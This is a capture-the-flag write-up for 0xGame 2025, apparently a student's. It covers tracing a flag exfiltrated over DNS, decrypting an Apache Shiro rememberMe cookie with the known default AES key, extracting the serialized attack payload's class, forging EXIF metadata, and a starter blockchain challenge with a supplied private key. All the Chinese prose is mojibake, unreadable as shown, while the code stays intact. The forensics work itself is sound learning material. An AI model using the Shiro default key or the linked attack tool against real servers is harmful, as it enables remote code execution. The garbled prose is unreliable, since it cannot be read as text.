è¿™ä¸ªå‘½ä»¤çš„æ„æ€æ˜¯è®¿é—®ä¸€ä¸ªå­åŸŸåï¼Œç„¶ååŸŸåçš„å‰ç¼€æ˜¯ç”¨ä¸€ç³»åˆ—å‘½ä»¤å¾—åˆ°çš„ï¼š

`cat flag->rev(ç¿»è½¬è¾“å‡º)->è¿›è¡Œrot13ç§»ä½->base64ç¼–ç ->åˆ é™¤æ¢è¡Œç¬¦`

è§£å¯†å°±å€’ç€æ¥å³å¯ï¼Œå…ˆè¯´è¯´å¯†æ–‡åœ¨å“ªé‡Œ

æˆ‘ä»¬è§‚å¯Ÿåˆ°å‘½ä»¤æ‰§è¡Œåï¼Œç›®æ ‡æœåŠ¡å™¨ä¸Š**æ²¡æœ‰äº§ç”Ÿå®Œæ•´çš„ HTTP æˆ– TCP è¿æ¥æµé‡**ï¼Œè¿™è¡¨æ˜æ•°æ®æ²¡æœ‰é€šè¿‡ä¼ ç»Ÿä¿¡é“ï¼ˆå¦‚ HTTP å›æ˜¾ï¼‰è¿”å›ã€‚

è¿™æ˜¯å› ä¸ºåœ¨æµé‡æŠ“åŒ…ä¸­ï¼Œæµé‡åè®®ä¼šå°†è®¿é—®æŸä¸ªå­åŸŸåçš„æµé‡å®šä¹‰ä¸º dns æµé‡ï¼Œå°±æ˜¯è¯´æœåŠ¡å™¨è®¿é—®åŸŸåçš„æ—¶å€™ï¼Œéœ€è¦å…ˆæœ¬åœ°è¿›è¡Œ dns è§£æï¼Œç„¶åæ‰èƒ½è¿›è¡Œåç»­çš„äº¤äº’ï¼Œhacker å°±æ˜¯åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå°†å¯†æ–‡ç»™ç”¨ dns æµé‡ä¼ é€’å‡ºæ¥äº†

```plain
fTBlMXVGX2dmaFd7cnpuVGswCg==
```

è§£å¯†è„šæœ¬

æœ‰ä¸ªæ›´è½»æ¾çš„æ–¹æ³•

```bash
$ echo fTBlMXVGX2dmaFd7cnpuVGswCg== | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev
0xGame{Just_Sh1r0}
```

#### ä¸€äº›æ‹“å±•

> å…³äº shiro ååºåˆ—åŒ–æ¼æ´çš„åŸç†ä»¥åŠä¸€æ­¥ä¸€æ­¥è§£å¯†ï¼Œå¯¹å¤§å®¶æ¥è¯´è¾ƒéš¾ï¼Œæ‰€ä»¥ä¸åšè¦æ±‚ï¼Œå¯ä»¥çœ‹çœ‹

é¦–å…ˆè¦å¯¹ Apache shiro ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨æœ‰æ‰€äº†è§£ï¼ˆé€šå¸¸è¢«ç§°ä¸º **Shiro-550** å’Œ **Shiro-721** æ¼æ´ï¼‰

è¯¥æ¼æ´çš„æ ¸å¿ƒåœ¨äº Apache Shiro æ¡†æ¶çš„ **â€œRemember Meâ€**ï¼ˆè®°ä½æˆ‘ï¼‰åŠŸèƒ½ã€‚

å½“ç”¨æˆ·å‹¾é€‰â€œè®°ä½æˆ‘â€ç™»å½•æ—¶ï¼ŒShiro ä¼šæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

1. å°†ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼ˆä¸€ä¸ªå®ç°äº† `Serializable` æ¥å£çš„å¯¹è±¡ï¼Œå¦‚ `Principal`ï¼‰è¿›è¡Œ **Java åºåˆ—åŒ–**ã€‚

2. å¯¹åºåˆ—åŒ–åçš„æ•°æ®è¿›è¡Œ **AES åŠ å¯†**ã€‚

3. å¯¹å¯†æ–‡è¿›è¡Œ **Base64 ç¼–ç **ã€‚

4. å°†æœ€ç»ˆçš„ Base64 å­—ç¬¦ä¸²ä½œä¸º `rememberMe`**&#x20;Cookie** çš„å€¼å‘é€ç»™å®¢æˆ·ç«¯ã€‚

å½“å®¢æˆ·ç«¯å¸¦ç€è¿™ä¸ª `rememberMe` Cookie è®¿é—®æœåŠ¡å™¨æ—¶ï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡Œé€†å‘æ“ä½œï¼š**Base64 è§£ç  â†’ AES è§£å¯† â†’ Java ååºåˆ—åŒ–**ã€‚

æ”»å‡»è€…åˆ©ç”¨çš„å°±æ˜¯ä¸­é—´çš„ AES åŠ å¯†å¯†é’¥å’Œæœ€åçš„ Java ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œæ¥ rce æ‰§è¡Œå‘½ä»¤

> å¦‚æœä¸Šé¢æœ‰ç–‘æƒ‘çš„è¯ï¼Œå¯¹æœ¬é¢˜å½±å“ä¸å¤§ï¼Œæ¨èè¿™ä¸ª[webshell å·¥å…·](https://github.com/SummerSec/ShiroAttack2)ï¼Œå¯ä»¥ç©ç©

æ€»ä¹‹ï¼Œè¿™é‡Œçš„è§£å¯†è¿‡ç¨‹å°±æ˜¯ Base64â†’ AES â†’ Java ååºåˆ—åŒ–

ç„¶åæˆ‘ä»¬éœ€è¦ä¸€äº›å…³é”®ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ AES çš„å¯†é’¥ï¼Œåœ¨æ—©æœŸ shiro æ¡†æ¶ï¼Œè¿™ä¸ªå¯†é’¥æ˜¯é»˜è®¤å›ºå®šçš„`kPH+bIxk5D2deZiIxcaaaA==`,åœ¨æ­£å¸¸è§£å¯† shiro æµé‡æ—¶ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°è¯•çˆ†ç ´å¯†é’¥ï¼Œä½†åœ¨æœ¬é¢˜ä¸­ï¼Œç›´æ¥æ‹¿æ¥ç”¨å³å¯

ç„¶åè¿˜éœ€è¦ aes åŠ å¯†çš„ iv å‘é‡ï¼Œé»˜è®¤æ˜¯ base64 è§£ç åçš„å‰ 16 ä¸ªå­—èŠ‚

```python
import base64
from Crypto.Cipher import AES
import os

def decrypt_data(encrypted_b64, key_b64):
    try:

        encrypted_data = base64.b64decode(encrypted_b64)
        print(f"Base64è§£ç åæ•°æ®é•¿åº¦: {len(encrypted_data)} å­—èŠ‚")

        key = base64.b64decode(key_b64)
        print(f"AESå¯†é’¥é•¿åº¦: {len(key)} å­—èŠ‚")

        iv = encrypted_data[:16]
        print(f"IV (åå…­è¿›åˆ¶): {iv.hex()}")

        actual_encrypted_data = encrypted_data[16:]
        print(f"å®é™…åŠ å¯†æ•°æ®é•¿åº¦: {len(actual_encrypted_data)} å­—èŠ‚")

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_data = cipher.decrypt(actual_encrypted_data)

        unpadded_data = unpad_pkcs7(decrypted_data)
        
        return unpadded_data
        
    except Exception as e:
        print(f"è§£å¯†è¿‡ç¨‹ä¸­å‡ºç°é”™è¯¯: {e}")
        return None

def unpad_pkcs7(data):

    padding_length = data[-1]
    return data[:-padding_length]

def save_to_file(data, filename):

    try:
        with open(filename, 'wb') as f:
            f.write(data)
        print(f"è§£å¯†ç»“æœå·²ä¿å­˜åˆ°: {filename}")
        return True
    except Exception as e:
        print(f"ä¿å­˜æ–‡ä»¶æ—¶å‡ºç°é”™è¯¯: {e}")
        return False

def main():
    encrypted_b64 = input("è¯·è¾“å…¥base64ç¼–ç çš„åŠ å¯†æ•°æ®: ").strip()
    key_b64 = input("è¯·è¾“å…¥base64æ ¼å¼çš„AESå¯†é’¥: ").strip()
    output_filename = input("è¯·è¾“å…¥è¾“å‡ºæ–‡ä»¶å(é»˜è®¤: decrypted_result.bin): ").strip()
    
    if not output_filename:
        output_filename = "decrypted_result.bin"
    print("å¼€å§‹è§£å¯†...")
    decrypted_data = decrypt_data(encrypted_b64, key_b64)
    
    if decrypted_data is not None:
        print(f"\nè§£å¯†æˆåŠŸ!")
        print(f"è§£å¯†æ•°æ®é•¿åº¦: {len(decrypted_data)} å­—èŠ‚")
        print(f"è§£å¯†æ•°æ®å‰16å­—èŠ‚(åå…­è¿›åˆ¶): {decrypted_data[:16].hex()}")

        try:
            text_output = decrypted_data.decode('utf-8')
            print(f"æ–‡æœ¬å†…å®¹é¢„è§ˆ: {text_output[:100]}...")
        except:
            print("è§£å¯†ç»“æœåŒ…å«äºŒè¿›åˆ¶æ•°æ®ï¼Œæ— æ³•æ˜¾ç¤ºä¸ºæ–‡æœ¬")

        if save_to_file(decrypted_data, output_filename):
            print(f"\næ–‡ä»¶å·²ä¿å­˜ä¸º: {output_filename}")
        else:
            print("æ–‡ä»¶ä¿å­˜å¤±è´¥")
    else:
        print("è§£å¯†å¤±è´¥")

if __name__ == "__main__":
    main()
```

è¿™æ˜¯è§£å¯†åå¾—åˆ°çš„æ–‡ä»¶

```bash
$ file decrypted_result.bin
decrypted_result.bin: Java serialization data, version 5
```

å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ Java åºåˆ—åŒ–æ–‡ä»¶ï¼Œæ˜¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸å¥½åˆ†æï¼Œæˆ‘ä»¬åªèƒ½å…ˆé€šè¿‡ååºåˆ—åŒ–å¤„ç†ï¼Œä½†æ˜¯ä¹Ÿå°±æ˜¯è¿™ä¸€ç‚¹æœ€éš¾

> å¯æƒœæˆ‘è¿˜æ²¡å­¦ä¼šè¿™ç§æ–‡ä»¶çš„åˆ†æå¤„ç†~~ï¼ˆåœ¨å­¦äº†ï¼Œåœ¨å­¦äº†~~\
> ~~æ‰€ä»¥è¿˜æ˜¯å›åˆ°é‚£ä¸ªåœ¨çº¿è§£å¯†å·¥å…·å§~~

~~åœ¨çº¿ shiro è§£å¯†å·¥å…·~~~~<https://potato.gold/navbar/tool/shiro/ShiroTool.html>~~

å­¦ä¼šå’¯ï¼Œæ„Ÿè°¢ sprengï¼Œä»–æ•™ä¼šæˆ‘æ€ä¹ˆå¤„ç†ä¸€ä¸ª Java åºåˆ—åŒ–æ–‡ä»¶

![thanks](/img/0xgame2025/thanks.gif)

é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥åœ¨åºåˆ—åŒ–æ–‡ä»¶ä¸­æå– classï¼Œè¿™ä¸€æ­¥éš¾åº¦ä¸å¤§ï¼Œpython è„šæœ¬å¯ä»¥å®ç°

```python
import javaobj


def putsMessage(obj):
    print(f"ç±»: {obj.classdesc}")
    print(f"æ³¨è§£: {obj.annotations}")
    print(
        f"ç§æœ‰å±æ€§: {[i for i in dir(obj) if i.startswith('_') and not i.startswith('__')]}"
    )
    print(f"å…¬æœ‰å±æ€§: {[i for i in dir(obj) if not i.startswith('_')]}")


with open("decrypted_result.bin", "rb") as f:

    parser = javaobj.JavaObjectUnmarshaller(f)
    try:
        obj = parser.readObject()
        putsMessage(obj)
        putsMessage(obj.annotations[1])

        print(len(obj.annotations[1]._bytecodes[0]))
        with open("shiro_payload_output.class", "wb") as f2:
            for i in obj.annotations[1]._bytecodes[0]:
                f2.write(int.to_bytes((i + 256) % 256, 1))

    except EOFError:
        print("æ–‡ä»¶è§£æå®Œæˆ")
```

æ¥ç€ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ crf.jar è¿›è¡Œåç¼–è¯‘ï¼ˆç¥å™¨ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œä¸‹è½½[æˆ‘çš„ crf](https://www.alipan.com/s/1n8e679GWu5)

```bash
java -jar cfr.jar shiro_payload_output.class > output.java
```

åç¼–è¯‘å‡ºæ¥çš„ç»“æœå¾ˆæ¸…æ™°

![image-20251008113818934](/img/0xgame2025/20251013231153_003.webp)![image-20251008113835006](/img/0xgame2025/20251013231153_004.webp)

ä¸€äº›å¿…è¦çš„ç»†èŠ‚éƒ½æœ‰

> ç”±äºè®¾å¤‡å·®å¼‚å§ï¼Œæˆ‘ä¸Šé¢ç”¨è„šæœ¬æå– class çš„æ—¶å€™ï¼Œä»£ç å·²ç»è¶³å¤Ÿæ¸…æ™°äº†ï¼Œç”šè‡³ä¸‹é¢çš„ crf æ“ä½œä¹Ÿä»…ä»…æ˜¯æ¢äº†ä¸ªå˜é‡åçš„æ ·å­ï¼Œå¯¹äº†ï¼Œæˆ‘ç”¨çš„ python åº“çš„åç§°æ˜¯ javaobj-py3

### ezEXIF

> ä¿¡æ¯ä¼ªé€ é¢˜ç›®ï¼Œæ¶‰åŠä¸€å®šçš„å›¾ç‰‡å®½é«˜ä¿®æ”¹

å…ˆè¯´è¯´å›¾ç‰‡å®½é«˜å§ï¼Œç”±äºè¿™äº›éƒ½æ˜¯â€œè§„å®šâ€ï¼ˆåˆ«é—®æˆ‘ä¸ºå•¥æ˜¯è¿™æ ·æ˜‚

#### å›¾ç‰‡å®½é«˜æ›´æ”¹

* png

* * é¦–å…ˆç”¨ 010 é”å®š ihdr å—ï¼Œç„¶åæ‰‹åŠ¨ç¼–è¾‘ï¼Œwidth å¯¹åº”çš„å®½åº¦ï¼Œheight å¯¹åº”çš„é«˜åº¦ï¼Œæ›´æ”¹æ•°å­—å³å¯

* jpg

* * ç”¨ 010 é”å®š sof0 æ•°æ®å—ï¼Œå›¾ç‰‡çš„å®½é«˜åœ¨è¿™é‡Œæ§åˆ¶ï¼ŒåŒæ ·ç›´æ¥æ›´æ”¹æ•°å­—ï¼Œç„¶åä¿å­˜å³å¯

* gif

* * ç”¨ 010 æŸ¥çœ‹ LogicalScreenDescriptorï¼Œä¸‹é¢çš„ Width å’Œ Height æ§åˆ¶çš„å°±æ˜¯å®½é«˜

> ä¸Šé¢çš„ä¸‰ç§å®½é«˜æ›´æ”¹ï¼ŒæŸç§æ„ä¹‰ä¸Šï¼Œå…¶å®å¹¶ä¸ä¸€æ ·ï¼Œæ¯”æ–¹è¯´ png æ”¹å˜å®½é«˜ï¼Œä»…ä»…æ˜¯å¯¹åº”çš„ç”»é¢æ¶ˆå¤±ï¼Œç„¶è€Œå…¶ä»–éƒ¨åˆ†æ²¡æœ‰æ”¹å˜ï¼Œjpg çš„è¯ï¼Œä¸€æ—¦æ›´æ”¹å®½é«˜ï¼Œå“ªæ€•å¾ˆç»†å¾®ï¼Œå¯¹å›¾ç‰‡çš„æŸä¼¤ä¹Ÿå¾ˆå¤§ï¼Œé‡Œé¢çš„åŸç”±ï¼Œå¸Œæœ›å¤§å®¶èƒ½åœ¨å­¦ä¹ å¯¹åº”çš„æ–‡ä»¶ç»“æ„æ—¶ï¼Œç•™æ„ä¸‹ç»†èŠ‚ï¼Œæ¯”å¦‚è¯´ png æ˜¯ä¸€ç§æµåŠ å¯†å­˜å‚¨â€¦â€¦

#### exif ä¿¡æ¯ç¯¡æ”¹

ä¸å¾—ä¸è¯´ï¼Œexiftool å·¥å…·æœ€å¥½ç”¨

```plain
exiftool -Make="Hacker" \
		 -Model="Kali linux" \
		 -DateTimeOriginal#="9999:99:99 66:66:66" \
		 -Description="motto:I can be better!"\
		 00.png
```

å†å°†å®½é«˜æ›´æ”¹åï¼Œæäº¤å°±èƒ½æ‹¿åˆ° flag

### ezChain

> æœ€ç®€å•çš„ä¸Šé“¾ï¼Œä¸»è¦æ˜¯æƒ³è®©æ–°ç”Ÿç†è§£åŒºå—é“¾é¢˜ç›®æ€ä¹ˆä¸Šæ‰‹ï¼Œéƒ¨ç½²åˆçº¦

æ­£å¸¸æ¥è¯´ï¼Œè§£å†³åŒºå—é“¾é¢˜ç›®ï¼Œæˆ‘ä»¬ä¼šè‡³å°‘æ‹¿åˆ°å››ä¸ªé‡è¦ä¿¡æ¯

ç¬¬ä¸€ä¸ªæ˜¯ rpc é“¾ï¼Œå¤§éƒ¨åˆ†é¢˜ç›®åº”è¯¥æ˜¯éƒ¨ç½²ç§é“¾ä¸Šè¿›è¡Œçš„ï¼Œéœ€è¦è¿›è¡Œç½‘ç»œé…ç½®

ç¬¬äºŒä¸ªæ˜¯åˆçº¦åœ°å€ï¼Œè¿™æ˜¯æˆ‘ä»¬å®ŒæˆæŒ‘æˆ˜å¿…é¡»æ‹¿åˆ°çš„é‡è¦ä¿¡æ¯

ç¬¬ä¸‰ä¸ªæ˜¯æ°´é¾™å¤´ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡å‡ºé¢˜äººæä¾›çš„æ°´é¾™å¤´è·å–éƒ¨åˆ†æµ‹è¯•å¸ï¼Œåˆçº¦éƒ¨ç½²è¿˜æœ‰äº¤æ˜“ç­‰ï¼Œéƒ½éœ€è¦ gas è´¹ç”¨ï¼Œä½†æ˜¯æœ¬é¢˜ä¸å¤ªä¸€æ ·ï¼Œä¼šæä¾›ä¸€ä¸ªç§é’¥ï¼Œé¢˜ç›®ä¼šè‡ªåŠ¨ç»™è¿™ä¸ªç§é’¥çš„è´¦æˆ·ä¸Šå…… 1eth,è¶³å¤Ÿåé¢çš„éƒ¨ç½²ç­‰è´¹ç”¨äº†

æœ€åå°±æ˜¯å…³é”®çš„æŒ‘æˆ˜åˆçº¦äº†ï¼Œsol è¯­æ³•éš¾æ˜“ä¸Šè¿˜å¥½ï¼Œå°±é‚£å‡ ä¸ªå¸¸ç”¨çš„ï¼Œå¤šè§å°±ä¼šè¯»ä¼šå†™äº†

#### how to solve

> ä¸‹é¢ä¸¾ä¾‹ç”¨è¿™ä¸ªç¯å¢ƒè¿›è¡Œ

```python
RPC_URL = "http://47.122.65.230:48334/65a7edf6-c415-4105-a26b-36f70f7913e6"
PRIVKEY = "fa7d264c487617dc552c2f0186111d321fc380762673e2ea6ce4973205ee9992"
SETUP_CONTRACT_ADDR = "0x074688F8E6f147502450B36f5eAa7CC3c3BAbA35"
WALLET_ADDR = "0x75248DebE8531030d4CDe342A5eBE8E7De5F4778"
```

* ä¸€äº›å‡†å¤‡

é¦–å…ˆéœ€è¦åœ¨æµè§ˆå™¨ä¸Šå®‰è£…**`metamask`**æ’ä»¶ï¼Œå‡ ä¹æ¯å®¶æµè§ˆå™¨éƒ½æœ‰è¿™ä¸ªçš„

![image-20251008003645578](/img/0xgame2025/20251013231153_005.webp)

æ¥ä¸‹æ¥å°±æ˜¯æ³¨å†Œï¼Œåˆ›å»ºæ–°é’±åŒ…ï¼Œè¿™äº›ä¸åšæˆªå›¾

* é…ç½® rpc

ç¬¬ä¸€æ¬¡ç™»å½•ï¼Œä¼šè‡ªåŠ¨è¿æ¥ä»¥å¤ªä¸»ç½‘ï¼Œæœ‰ä¸¤ä¸ªæ–¹å¼ï¼š

* * ä½¿ç”¨é­”æ³•

ç‚¹å‡»å·¦ä¸Šè§’çš„ Ethereum Mainnet,ä¼šè¿›å…¥é€‰æ‹©ç½‘ç»œçš„åŠŸèƒ½ï¼Œé€‰æ‹©æ·»åŠ è‡ªå®šä¹‰ç½‘ç»œ

* * ç­‰å¾…ä¸€ä¼šå„¿

å‡ºç°åˆ‡æ¢ç½‘ç»œ.jpg(æ²¡æˆªå›¾)

ç‚¹å‡»åï¼Œå¼¹çª—æ ·å­å’Œä¸Šé¢çš„é‚£ä¸ªå›¾ç‰‡æ˜¯ä¸€æ ·çš„

è¿™é‡Œéšä¾¿å¡«ï¼Œæ²¡å‡ºç°çº¢è‰²å°±æ²¡é”™

å…³äºè¿™é‡Œçš„é“¾ IDï¼Œä½ éšä¾¿è¾“å…¥ 1 ä¸ªæ•°å­—ï¼Œä¼šè‡ªåŠ¨å¼¹å‡ºæ­£ç¡®çš„é“¾ idï¼Œå°±é•¿è¿™æ ·ï¼Œæ”¹å›å»å³å¯

æœ€åä¿å­˜äº†ï¼Œæ‰ç®— rpc é…ç½®æˆåŠŸ

* ä½¿ç”¨ç§é’¥æ·»åŠ ç”¨æˆ·

å°† private key å¤åˆ¶è¿›å»ï¼Œå¯¼å…¥å³å¯ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æœ‰åˆå§‹ä½™é¢ 1ctf äº†

* éƒ¨ç½²åˆçº¦

æ¥ä¸‹æ¥éœ€è¦ä½¿ç”¨åœ¨çº¿ ide - [remix](https://remix.ethereum.org/)

metamask åœ¨å“ªä¸ªæµè§ˆå™¨ï¼Œå°±åœ¨å“ªä¸ªæµè§ˆå™¨ä¸Šè®¿é—®

æ–°å»ºä¸ª sol æ–‡ä»¶ï¼Œå°†é¢˜ç›®ä¸‹å‘çš„ Setup.sol å¤åˆ¶è¿›å»ï¼Œæ–‡ä»¶åä¹Ÿè¦ä¸€æ ·çš„å–”ï¼Œè¿™é‡Œè®¾è®¡åˆçº¦é‡Œé¢çš„åˆçº¦åï¼Œæ€»ä¹‹å°±æ˜¯è¦ä¸€æ ·

ç„¶åè¿›è¡Œç¼–è¯‘ï¼Œéƒ¨ç½²

è¿™é‡Œè¿›è¡Œéƒ¨ç½²ï¼Œéœ€è¦å…ˆè®¾ç½®ç¯å¢ƒï¼Œé€‰ä¸­æµè§ˆå™¨æ’ä»¶-->Injected Provider-MetaMask ä¼šè‡ªåŠ¨å…³è”å½“å‰é’±åŒ…ç”¨æˆ·ä»¥åŠå¯¹åº”ç½‘ç»œï¼Œç„¶åå†å°†åˆçº¦åœ°å€å¤åˆ¶è¿‡æ¥ï¼Œç²˜è´´åˆ° At Address ä¸­ï¼Œç‚¹å‡»å³å¯ï¼ˆè¦å¤§è‡´ç†è§£ï¼Œæˆ‘ä»¬çš„æŒ‘æˆ˜åˆçº¦åº”è¯¥éƒ¨ç½²åˆ°é¢˜ç›®ä¸‹å‘çš„é‚£ä¸ªåœ°å€ï¼Œä¸ç„¶æˆ‘ä»¬è¦æ˜¯æˆåŠŸäº†ï¼Œé¢˜ç›®æ€ä¹ˆåˆ¤å®šå‘¢ï¼Ÿ

{% raw %}

```liquid
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Setup {
    bool private solved;
    string private constant WINNING_PHRASE = "welcome_to_0xGame2025";

    constructor() payable {
    }

    function solve(string memory phrase) public {
        if (keccak256(abi.encodePacked(phrase)) == keccak256(abi.encodePacked(WINNING_PHRASE))) {
            solved = true;
        } else {
            revert("Setup: Incorrect phrase.");
        }
    }

    function isSolved() external view returns (bool) {
        return solved;
    }

    receive() external payable {}
}
```

{% endraw %}

* å®¡è®¡åˆçº¦å®ŒæˆæŒ‘æˆ˜

è¯»å®ŒæŒ‘æˆ˜åˆçº¦ï¼Œå°±è€ƒå¯Ÿäº†ä¸€ç‚¹ï¼Œå°±æ˜¯é€‰æ‰‹éœ€è¦æäº¤ä¸€ä¸ªå­—ç¬¦ä¸²`welcome_to_0xGame2025`ï¼Œåªæœ‰è¿™æ ·ï¼Œæ‰èƒ½è®© solved è¿”å› trueï¼Œæ‰ç®—å®Œæˆäº†æŒ‘æˆ˜ï¼ˆçœŸçš„æ˜¯ç®€å•ä¸Šé“¾å§ï¼Œç®—æ˜¯ 0xgame2025week2 çš„ä¸€ä¸ªç­¾åˆ°é¢˜

> è¿™æ˜¯åŒºå—é“¾ä¸Šæœ€æœ€åŸºç¡€çš„çŸ¥è¯†ï¼ˆæ²¡æœ‰æ¶‰åŠä»»ä½•åŒºå—é“¾å®‰å…¨ï¼ŒåŒºå—é“¾è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ï¼Œåœ¨å›½å¤–èµ›äº‹æˆ–å›½å†…å¤§å‹èµ›äº‹ä¸­ä¼šç»å¸¸çœ‹åˆ° blockchainï¼Œè¿™ä¸ªèµ›é“ç›¸å¯¹æ¥è¯´ï¼Œç¡®å®å¾ˆæ–°å¾ˆéš¾ï¼Œå¦‚æœå¤§å®¶åé¢æ‰“ç®—ä¸“æ”» miscï¼Œå¯ä»¥å¯¹åŒºå—é“¾ç ”ç©¶ä¸€äºŒï¼Œç›¸ä¿¡ä¼šæœ‰äººä½“ä¼šåˆ°åŒºå—é“¾çš„é­…åŠ›çš„

